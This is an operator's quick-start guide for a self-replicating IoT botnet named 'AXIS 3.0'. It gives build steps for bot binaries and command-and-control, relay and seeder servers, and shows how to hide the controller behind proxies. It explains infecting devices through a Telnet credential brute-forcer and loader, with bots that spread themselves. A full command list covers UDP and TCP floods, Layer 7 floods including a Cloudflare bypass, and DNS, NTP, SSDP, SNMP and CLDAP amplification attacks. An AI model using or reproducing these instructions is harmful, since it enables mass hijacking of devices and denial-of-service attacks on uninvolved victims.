# AXIS 3.0 - Quick Start Guide

## What's New in 3.0

1. **DNS Resolution on Bots**: All L4 attacks resolve domains via 7 rotating DNS servers
2. **URL-Based L7 Attacks**: Bots parse URLs automatically - no `domain=x` needed
3. **Integrated Scanners**: C2 includes ZMap + Telnet bruter with auto-deployment
4. **Scanner Commands**: `scan <startIP> <endIP> [port]` from admin panel
5. **C2 Renamed**: `cnc/` directory renamed to `C2/`

## How It Works

1. **Torrent-style distribution**: Every bot downloads ALL binaries from the P2P network and becomes a seeder.
2. **Self-replication**: Every bot runs 20+ scanners to find and infect new devices.
3. **C2 via proxies**: C2 joins the P2P network through proxy peers to stay hidden.
4. **Auto-seed control**: C2 stops seeding binaries at 200 bots, resumes below 200.
5. **Integrated scanning**: ZMap finds open ports, Telnet bruter tries credentials, results auto-feed to loader.

## 1. Build Everything

```bash
chmod +x build.sh build_relay.sh build_scanners.sh
./build.sh
./build_relay.sh
```

**Output:**
```
bins/axis.*          # 13 bot architectures (with selfrep + torrent seeding)
cnc_server           # C&C server
seeder_server        # P2P attack command seeder
relay_server         # P2P relay server
loader               # Telnet loader (P2P torrent payload)
```

## 2. Configure

### bot/config.h
```c
#define CNC_ADDR "YOUR_VPS_IP"
#define P2P_SEEDS ""   // Empty = broadcast auto-discovery, or "IP1:49152,IP2:49152"
```

### relay/config.go
```go
var seedPeers = []string{
    "VPS1_IP:49152",
    "VPS2_IP:49152",
}
var validUsers = map[string]string{
    "admin": "YOUR_PASSWORD",  // CHANGE THIS!
}
```

### cnc/admin.go (line ~270)
```go
p2pSeeds := "VPS1_IP:49152,VPS2_IP:49152"
proxies := []string{
    // Add proxy peer IPs to shield CNC IP
    // "PROXY1:49152", "PROXY2:49152",
}
```

### p2p_ctrl.py
```python
SEEDS = [
    ("VPS1_IP", 49152),
    ("VPS2_IP", 49152),
]
```

## 3. Start Services

### C&C Server
```bash
sudo ./cnc_server   # Root for port 443
# Or: sudo setcap 'cap_net_bind_service=+ep' ./cnc_server && ./cnc_server
```

### Seeder (Optional)
```bash
./seeder_server axis-l7 target.com 300
# Continuously re-seeds attack commands every 10 seconds
```

### Relay Server (Alternative to C&C)
```bash
./relay_server
```

### Scan Listener
```bash
cd cnc && go build -o ../scanListen scanListen.go && cd ..
./scanListen
# Outputs infection results to telnet.txt
```

## 4. Infect Devices

```bash
./loader
# Feed IPs via stdin:
192.168.1.1:23 root:admin arm
10.0.0.1:23 admin:password mips

# Infected devices will:
# 1. Download ALL axis.* binaries from P2P peers (torrent-style)
# 2. Become seeders for new infections
# 3. Start scanning for more devices
```

## 5. Launch Attacks

### Via C&C Admin Panel
```bash
openssl s_client -connect YOUR_VPS_IP:6969 -quiet
# Login: admin / YOUR_PASSWORD

help                     # Show all methods
status                   # Bot count
axis-l7 target.com 300   # L7 attack
udp 1.2.3.4 120          # UDP flood
syn 1.2.3.4 60 dport=80  # TCP SYN flood
```

### Via Seeder
```bash
./seeder_server axis-l7 target.com 300
./seeder_server udp 1.2.3.4 120
```

### Via P2P Controller
```bash
python3 p2p_ctrl.py axis-l7 1.2.3.4 300
```

### Via Relay
```bash
telnet RELAY_IP 6969
# Login: admin / YOUR_PASSWORD
axis-l7 target.com 300
```

## 6. Monitor

```bash
# P2P traffic
tcpdump -i any -n udp port 49152  # Commands
tcpdump -i any -n udp port 49153  # Binary downloads

# Bot processes
ps aux | grep axis

# Scan results
tail -f telnet.txt

# C&C logs
cat logs/commands.txt
cat logs/logins.txt
```

## Default Credentials

| Component | User | Password | Change In |
|-----------|------|----------|-----------|
| C&C Admin | admin | admin123 | cnc/database.json |
| Relay | admin | admin123 | relay/config.go |

**CHANGE THESE IMMEDIATELY!**

## Attack Methods

### Layer 4 UDP
```
udp <ip> <time> [len=1472] [dport=80]
vse <ip> <time> [dport=27015]
fivem <ip> <time> [dport=30120]
pps <ip> <time>
```

### Layer 4 TCP
```
syn <ip> <time> [dport=80]
ack <ip> <time> [dport=80]
fin <ip> <time> [dport=80]
rst <ip> <time> [dport=80]
tcpconn <ip> <time> [dport=80]
xmas <ip> <time> [dport=80]
null <ip> <time> [dport=80]
window <ip> <time> [dport=80]
```

### Layer 7
```
tls <url> <time> [domain=x]
tlsplus <url> <time> [domain=x]
cf <url> <time> [domain=x]
axis-l7 <url> <time> [domain=x]
```

### Amplification
```
dns-amp <ip> <time>
ntp-amp <ip> <time>
ssdp-amp <ip> <time>
snmp-amp <ip> <time>
cldap-amp <ip> <time>
```

### Special
```
icmp <ip> <time>
greip <ip> <time>
greeth <ip> <time>
```

## Troubleshooting

### Bots not downloading binaries
```bash
# Check P2P file port is open
netstat -anu | grep 49153

# Monitor file requests
tcpdump -i any -n udp port 49153 -X

# Verify binaries exist on seeders
ls -la /tmp/axis.* ./axis.* bins/axis.*
```

### Self-replication not working
```bash
# Check SELFREP is enabled
grep SELFREP bot/config.h
# Should show: #define SELFREP

# Rebuild bots
./build.sh
```

### CNC not connecting to P2P
```bash
# Test UDP connectivity
nc -uvz SEED_IP 49152

# Monitor P2P traffic
tcpdump -i any -n udp port 49152
```

---

**For full documentation, see [README.md](README.md)**
